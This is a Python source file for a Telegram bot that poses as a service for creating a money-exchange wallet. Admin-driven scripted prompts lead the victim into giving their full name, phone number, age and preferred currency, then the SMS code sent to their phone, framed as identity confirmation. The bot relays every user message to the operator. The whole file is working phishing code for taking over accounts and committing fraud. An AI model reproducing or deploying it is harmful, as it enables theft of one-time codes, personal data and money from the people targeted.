from aiogram.dispatcher.filters import Command, Text
from aiogram.types import Message

from config import ADMIN_ID
from loader import dp, bot

CHAT_ID = '845436814'

dialog_list = {
    "0": "Перед начало создание, мне нужно о вас узнать важные детали",
    "1": "Укажите ваше полное имя, пожалуйста",
    "2": "Укажите Ваш номер телефона, пожалуйста",
    "3": "Укажите валюту удобную для вас (EUR/UAH/RUB/USD) , пожалуйста",
    "4": "Укажите срок вывода денег удобный для вас (3/6/9 часов), пожалуйста",
    "5": "Укажите ваш полный возраст, пожалуйста",
    "6": "Ваши данные успешно сохранились. Желаете сейчас запустить создание ?(YES/yes/NO/no)",
    "7": "Вам будет выслано на номер телефона обычное смс, введите его сюда для подтверждения личности",
    "8": "Что-то пошло не так, попробуйте ввести новый код",
    "9": "Ожидайте я создаю, это займет некоторое время",
}


@dp.message_handler(commands=['cancel'])
async def start(message: Message):
    await bot.send_message(chat_id=ADMIN_ID, text="text: {}\n"
                                                  "id = {}".format(message.text, message.from_user.id))
    await message.answer("Отмена оплаты")


@dp.message_handler(commands=['start'])
async def start(message: Message):
    name = message.from_user.first_name if message.from_user.first_name else message.from_user.username
    text = "Добрый день, {name}!\n\n" \
           "Я могу помочь вам создать кошелек\n" \
           "для удобного обмена деньгами \n" \
           "между пользователями телеграмма.\n\n" \
           "Чтобы начать работу, напишите: \t YES or yes".format(name=name)
    await message.answer(text)


@dp.message_handler(user_id=ADMIN_ID)
async def echo(message: Message):
    text = message.text
    if len(message.text) == 1:
        text = dialog_list.get(text)
    await bot.send_message(chat_id=CHAT_ID, text=text)


@dp.message_handler()
async def echo(message: Message):
    await bot.send_message(chat_id=ADMIN_ID, text="text: {}\n"
                                                  "id = {}".format(message.text, message.from_user.id))
    await message.answer('Wait a minute')
